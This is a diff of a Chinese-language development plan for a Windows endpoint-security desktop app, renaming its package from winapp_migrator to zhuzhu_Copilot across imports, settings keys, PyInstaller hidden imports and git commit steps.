-from winapp_migrator.core.security_engine.ransomware_shield import default_protected_dirs
-from winapp_migrator.utils.helpers import is_admin
+from zhuzhu_Copilot.core.security_engine import amsi_bridge
+from zhuzhu_Copilot.core.security_engine.ransomware_shield import default_protected_dirs
+from zhuzhu_Copilot.utils.helpers import is_admin
 
 SETTINGS_KEY_DIRS = "security_protected_dirs"
 SETTINGS_KEY_TRUST = "security_trusted_dirs"
@@ -3208,7 +3208,7 @@ SETTINGS_KEY_LLM = "security_llm_on"
 
 def _load_list(key: str, default: list) -> list:
     try:
-        v = QSettings("WinAppMigrator", "WinAppMigrator").value(key)
+        v = QSettings("zhuzhu Copilot", "zhuzhu Copilot").value(key)
         if isinstance(v, str) and v:
             return json.loads(v)
         if isinstance(v, list):
@@ -3232,7 +3232,7 @@ class SecuritySettingsDialog(QDialog):
         self.setWindowTitle("安全防护设置")
         self.setMinimumWidth(540)
         self._engine_provider = engine_provider
-        self._settings = QSettings("WinAppMigrator", "WinAppMigrator")
+        self._settings = QSettings("zhuzhu Copilot", "zhuzhu Copilot")
         lay = QVBoxLayout(self)
         lay.setSpacing(10)
 
@@ -3360,7 +3360,7 @@ class SecuritySettingsDialog(QDialog):
 
 def _llm_cfg() -> dict:
     try:
-        from winapp_migrator.core.agent_llm import load_model_config
+        from zhuzhu_Copilot.core.agent_llm import load_model_config
         cfg = load_model_config() or {}
         return {"enabled": True, "base_url": cfg.get("base_url") or "",
                 "api_key": cfg.get("api_key") or "", "model": cfg.get("model") or "",
@@ -3373,15 +3373,15 @@ def _llm_cfg() -> dict:
 
 三处精确修改：
 
-1. 文件头部 imports（在 `from winapp_migrator.core.security import SecurityScanner, quarantine_dir` 之后追加）：
+1. 文件头部 imports（在 `from zhuzhu_Copilot.core.security import SecurityScanner, quarantine_dir` 之后追加）：
 
 ```python
-from winapp_migrator.core.security_engine.engine import SecurityEngine
-from winapp_migrator.core.security_engine.ransomware_shield import RansomwareShield, default_protected_dirs
-from winapp_migrator.core.security_engine.startup_guard import StartupGuard
-from winapp_migrator.core.security_engine.command_intel import CommandIntel
-from winapp_migrator.core.security_engine.amsi_bridge import AmsiBridge
-from winapp_migrator.ui.security_settings_dialog import SecuritySettingsDialog, _load_list
+from zhuzhu_Copilot.core.security_engine.engine import SecurityEngine
+from zhuzhu_Copilot.core.security_engine.ransomware_shield import RansomwareShield, default_protected_dirs
+from zhuzhu_Copilot.core.security_engine.startup_guard import StartupGuard
+from zhuzhu_Copilot.core.security_engine.command_intel import CommandIntel
+from zhuzhu_Copilot.core.security_engine.amsi_bridge import AmsiBridge
+from zhuzhu_Copilot.ui.security_settings_dialog import SecuritySettingsDialog, _load_list
 ```
 
 1. `SecurityMonitorWorker.__init__`（在 `self.guard = ExecutionGuard()` 之后追加）与 `run`（嵌套 try/finally）与 `stop`：
@@ -3390,7 +3390,7 @@ from winapp_migrator.ui.security_settings_dialog import SecuritySettingsDialog, 
         # ---- 端点防护引擎（子项目A）：统一事件流监测器 ----
         self.engine = SecurityEngine()
         self.engine.set_notify(self._engine_event)
-        s = QSettings("WinAppMigrator", "WinAppMigrator")
+        s = QSettings("zhuzhu Copilot", "zhuzhu Copilot")
         self.engine.set_action_level(str(s.value("security_action_level", "graded")) or "graded")
         if s.value("security_llm_on", False, type=bool):
             self.engine.set_llm_cfg(_llm_cfg_from_settings())
@@ -3442,7 +3442,7 @@ from winapp_migrator.ui.security_settings_dialog import SecuritySettingsDialog, 
 ```python
 def _llm_cfg_from_settings() -> dict:
     try:
-        from winapp_migrator.core.agent_llm import load_model_config
+        from zhuzhu_Copilot.core.agent_llm import load_model_config
         cfg = load_model_config() or {}
         return {"enabled": True, "base_url": cfg.get("base_url") or "",
                 "api_key": cfg.get("api_key") or "", "model": cfg.get("model") or "",
@@ -3496,7 +3496,7 @@ Run: `python scripts/smoke_test.py`
 Expected: 现有回归通过
 
 ```powershell
-git add src/winapp_migrator/ui/security_settings_dialog.py src/winapp_migrator/ui/main_window.py scripts/_verify_security_settings.py ; git commit -m "feat(security): 防护设置对话框与监控线程引擎接入（UI集成）"
+git add src/zhuzhu_Copilot/ui/security_settings_dialog.py src/zhuzhu_Copilot/ui/main_window.py scripts/_verify_security_settings.py ; git commit -m "feat(security): 防护设置对话框与监控线程引擎接入（UI集成）"
 ```
 
 ***
@@ -3505,13 +3505,13 @@ git add src/winapp_migrator/ui/security_settings_dialog.py src/winapp_migrator/u
 
 **Files:**
 
-* Modify: `build/WinAppMigrator.spec`
+* Modify: `build/zhuzhu_Copilot.spec`
 
 * Modify: `build_sign.ps1`
 
 * [ ] **Step 13.1: 读当前 spec 的 datas/hiddenimports 段并追加**
 
-Run: `rg -n "datas|hiddenimports|Analysis\(" build/WinAppMigrator.spec`
+Run: `rg -n "datas|hiddenimports|Analysis\(" build/zhuzhu_Copilot.spec`
 然后按现有风格追加：
 
 ```python
@@ -3522,17 +3522,17 @@ Run: `rg -n "datas|hiddenimports|Analysis\(" build/WinAppMigrator.spec`
     ],
     hiddenimports=[
         # ...现有条目...
-        "winapp_migrator.core.security_engine",
-        "winapp_migrator.core.security_engine.engine",
-        "winapp_migrator.core.security_engine.rules",
-        "winapp_migrator.core.security_engine.file_intel",
-        "winapp_migrator.core.security_engine.signature",
-        "winapp_migrator.core.security_engine.script_intel",
-        "winapp_migrator.core.security_engine.llm_analyzer",
-        "winapp_migrator.core.security_engine.ransomware_shield",
-        "winapp_migrator.core.security_engine.startup_guard",
-        "winapp_migrator.core.security_engine.command_intel",
-        "winapp_migrator.core.security_engine.amsi_bridge",
+        "zhuzhu_Copilot.core.security_engine",
+        "zhuzhu_Copilot.core.security_engine.engine",
+        "zhuzhu_Copilot.core.security_engine.rules",
+        "zhuzhu_Copilot.core.security_engine.file_intel",
+        "zhuzhu_Copilot.core.security_engine.signature",
+        "zhuzhu_Copilot.core.security_engine.script_intel",
+        "zhuzhu_Copilot.core.security_engine.llm_analyzer",
+        "zhuzhu_Copilot.core.security_engine.ransomware_shield",
+        "zhuzhu_Copilot.core.security_engine.startup_guard",
+        "zhuzhu_Copilot.core.security_engine.command_intel",
+        "zhuzhu_Copilot.core.security_engine.amsi_bridge",
     ],
 ```
 
@@ -3573,7 +3573,7 @@ Expected: 全部退出码 0（\_verify\_amsi\_dll.py 无管理员时允许 SKIP�
 * [ ] **Step 13.4: 提交**
 
 ```powershell
-git add build/WinAppMigrator.spec build_sign.ps1 ; git commit -m "build(security): 打包集成security_engine/规则库/AMSI DLL与签名"
+git add build/zhuzhu_Copilot.spec build_sign.ps1 ; git commit -m "build(security): 打包集成security_engine/规则库/AMSI DLL与签名"
 ```
 
 ***
